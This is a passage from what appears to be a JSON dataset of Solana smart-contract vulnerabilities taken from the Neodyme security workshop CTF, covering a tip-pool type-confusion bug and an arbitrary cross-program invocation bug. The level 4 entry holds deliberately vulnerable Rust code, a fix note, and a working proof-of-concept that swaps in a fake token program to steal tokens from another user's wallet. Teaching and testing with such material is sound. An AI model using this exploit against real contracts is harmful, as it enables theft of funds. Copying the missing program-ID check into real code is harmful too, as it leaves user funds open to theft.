      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level3"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level3/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 3 - Tip Pool\n\n# Usage\n\nEver needed an easy and secure way to tip people? This contract will solve all your donation problems: The operator creates a vault. Then everyone who wants can create a pool for their personal donation account \u2013 to receive tips. For tax-reasons all funds are stored centrally, you can just withdraw the desired amount whenever you need them, and pay taxes at that point.\n\n# Example Flow\n\n- Initialize the contract\n- Create a pool\n- Tip to the pool\n- Withdraw from the ",
      "bug_hint": "# Bug\n\nThe `Vault` struct can be deserialized into a `TipPool` struct and only the owner of the accounts gets checked in the `withdraw` function.\n\nHow can you exploit this?",
      "has_progressive_hints": true,
      "workshop_level": "level3"
    }
  },
  {
    "id": "neodyme_level4_arbitrary_cpi",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "native",
    "file_name": "level4/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n// There's a mitigation for this bug in spl-token 3.1.1\n// vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet\nuse vendored_spl_token as spl_token;\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\n\npub enum WalletInstruction {\n    /// Initialize a Personal Savings Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Authority\n    /// (3) Owner\n    /// (4) Mint\n    /// (5) Rent sysvar\n    /// (6) SPL-Token program\n    /// (7) System program\n    Initialize,\n    /// Deposit\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Money Source\n    /// (3) Source Authority\n    /// (4) Mint\n    /// (5) SPL-Token program\n    Deposit { amount: u64 },\n    /// Withdraw from Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Authority\n    /// (3) Owner\n    /// (4) Destination\n    /// (5) Mint\n    /// (6) SPL-Token program\n    Withdraw { amount: u64 },\n}\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn get_wallet_address(owner: &Pubkey, wallet_program: &Pubkey) -> (Pubkey, u8) {\n    Pubkey::find_program_address(&[&owner.to_bytes()], wallet_program)\n}\n\npub fn get_authority(wallet_program: &Pubkey) -> (Pubkey, u8) {\n    Pubkey::find_program_address(&[], wallet_program)\n}\n\npub fn initialize(wallet_program: Pubkey, owner_address: Pubkey, mint: Pubkey) -> Instruction {\n    let wallet_address = get_wallet_address(&owner_address, &wallet_program).0;\n    let authority_address = get_authority(&wallet_program).0;\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new_readonly(authority_address, false),\n            AccountMeta::new(owner_address, true),\n            AccountMeta::new(mint, false),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(spl_token::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Initialize.try_to_vec().unwrap(),\n    }\n}\n\npub fn deposit(\n    wallet_program: Pubkey,\n    owner_address: Pubkey,\n    source: Pubkey,\n    source_authority: Pubkey,\n    mint: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(&owner_address, &wallet_program).0;\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(source, false),\n            AccountMeta::new_readonly(source_authority, true),\n            AccountMeta::new_readonly(mint, false),\n            AccountMeta::new_readonly(spl_token::id(), false),\n        ],\n        data: WalletInstruction::Deposit { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    wallet_program: Pubkey,\n    owner_address: Pubkey,\n    destination: Pubkey,\n    mint: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(&owner_address, &wallet_program).0;\n    let authority_address = get_authority(&wallet_program).0;\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new_readonly(authority_address, false),\n            AccountMeta::new_readonly(owner_address, true),\n            AccountMeta::new(destination, false),\n            AccountMeta::new_readonly(mint, false),\n            AccountMeta::new_readonly(spl_token::id(), false),\n        ],\n        data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::BorshDeserialize;\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    program_pack::Pack,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{get_authority, get_wallet_address, WalletInstruction};\n\n// There's a mitigation for this bug in spl-token 3.1.1\n// vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet\nuse vendored_spl_token as spl_token;\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match WalletInstruction::deserialize(&mut instruction_data)? {\n        WalletInstruction::Initialize => initialize(program_id, accounts),\n        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),\n        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n    }\n}\n\nfn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    msg!(\"init\");\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let owner = next_account_info(account_info_iter)?;\n    let mint = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let spl_token = next_account_info(account_info_iter)?;\n\n    let (wallet_address, wallet_seed) = get_wallet_address(owner.key, program_id);\n    let (authority_address, _) = get_authority(program_id);\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(wallet_info.key, &wallet_address);\n    assert_eq!(authority_info.key, &authority_address);\n    assert!(owner.is_signer, \"owner must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &owner.key,\n            &wallet_address,\n            rent.minimum_balance(spl_token::state::Account::LEN),\n            spl_token::state::Account::LEN as u64,\n            &spl_token.key,\n        ),\n        &[owner.clone(), wallet_info.clone()],\n        &[&[&owner.key.to_bytes(), &[wallet_seed]]],\n    )?;\n\n    invoke(\n        &spl_token::instruction::initialize_account(\n            &spl_token.key,\n            &wallet_address,\n            mint.key,\n            &authority_address,\n        )\n        .unwrap(),\n        &[\n            authority_info.clone(),\n            wallet_info.clone(),\n            mint.clone(),\n            rent_info.clone(),\n        ],\n    )?;\n\n    Ok(())\n}\n\nfn deposit(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"deposit {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n    let user_authority_info = next_account_info(account_info_iter)?;\n    let mint = next_account_info(account_info_iter)?;\n    let spl_token = next_account_info(account_info_iter)?;\n\n    let decimals = mint.data.borrow()[44];\n\n    invoke(\n        &spl_token::instruction::transfer_checked(\n            &spl_token.key,\n            &source_info.key,\n            mint.key,\n            wallet_info.key,\n            user_authority_info.key,\n            &[],\n            amount,\n            decimals,\n        )\n        .unwrap(),\n        &[\n            wallet_info.clone(),\n            source_info.clone(),\n            user_authority_info.clone(),\n            mint.clone(),\n        ],\n    )?;\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"withdraw {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let owner_info = next_account_info(account_info_iter)?;\n    let destination_info = next_account_info(account_info_iter)?;\n    let mint = next_account_info(account_info_iter)?;\n    let spl_token = next_account_info(account_info_iter)?;\n\n    let (wallet_address, _) = get_wallet_address(owner_info.key, program_id);\n    let (authority_address, authority_seed) = get_authority(program_id);\n\n    assert_eq!(wallet_info.key, &wallet_address);\n    assert_eq!(authority_info.key, &authority_address);\n    assert!(owner_info.is_signer, \"owner must sign!\");\n\n    let decimals = mint.data.borrow()[44];\n\n    invoke_signed(\n        &spl_token::instruction::transfer_checked(\n            &spl_token.key,\n            &wallet_info.key,\n            mint.key,\n            destination_info.key,\n            authority_info.key,\n            &[],\n            amount,\n            decimals,\n        )\n        .unwrap(),\n        &[\n            wallet_info.clone(),\n            destination_info.clone(),\n            authority_info.clone(),\n            mint.clone(),\n        ],\n        &[&[&[authority_seed]]],\n    )?;\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      95,
      100
    ],
    "vulnerability_type": "arbitrary_cpi",
    "category": "cpi_validation",
    "severity": "critical",
    "difficulty_tier": 3,
    "description": "Arbitrary Cross-Program Invocation (CPI) vulnerability. The program allows the caller to control which program is invoked during token withdraw, enabling an attacker to invoke a malicious program instead of the legitimate SPL token program.",
    "fix_description": "Hardcode the SPL token program ID and validate that the provided token_program matches spl_token::ID. Never allow user-controlled program IDs in CPI calls.",
    "poc_code": "use solana_program::instruction::{AccountMeta, Instruction};\nuse borsh::BorshSerialize;\n\nfn hack(env: &mut LocalEnvironment, challenge: &Challenge) {\n    assert_tx_success(env.execute_as_transaction(\n        &[level4::initialize(\n            challenge.wallet_program,\n            challenge.hacker.pubkey(),\n            challenge.mint,\n        )],\n        &[&challenge.hacker],\n    ));\n\n    let hacker_wallet_address = level4::get_wallet_address(\n        &challenge.hacker.pubkey(),\n        &challenge.wallet_program,\n    )\n    .0;\n    let authority_address = level4::get_authority(&challenge.wallet_program).0;\n    let fake_token_program =\n        env.deploy_program(\"target/deploy/level4_poc_contract.so\");\n\n    env.execute_as_transaction(\n        &[Instruction {\n            program_id: challenge.wallet_program,\n            accounts: vec![\n                AccountMeta::new(hacker_wallet_address, false),             // usually: wallet_address\n                AccountMeta::new_readonly(authority_address, false),        // usually: authority_address\n                AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // usually: owner_address\n                AccountMeta::new(challenge.wallet_address, false),          // usually: destination\n                AccountMeta::new_readonly(spl_token::ID, false),            // usually: expected mint\n                AccountMeta::new_readonly(fake_token_program, false),       // usually: spl_token program address\n            ],\n            data: level4::WalletInstruction::Withdraw { amount: 1337 }\n                .try_to_vec()\n                .unwrap(),\n        }],\n        &[&challenge.hacker],\n    )\n    .print_named(\"hax\");\n}",
    "references": [
      "https://workshop.neodyme.io",
      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level4"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level4/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 4\nAll the personal vaults we've seen so far only can only store SOL. \nLevel 4 now implements a vault for arbitrary SPL tokens, the standard token implementation on Solana.\n\nFor each user, the contract manages an SPL token account, to which deposits can be made.\nThe account is derived from the user's address, and only this user should be able to withdraw the tokens again. \n\nCan you spot the bug, and steal the tokens from the wallet?\n\nNote: this bug is a bit sneaky, so don't feel bad if yo",
      "bug_hint": "# Bug\n\nThe program allows you to control which program is invoked during withdraw. Can you exploit this?",
      "has_progressive_hints": true,
      "workshop_level": "level4"
    }
  }
]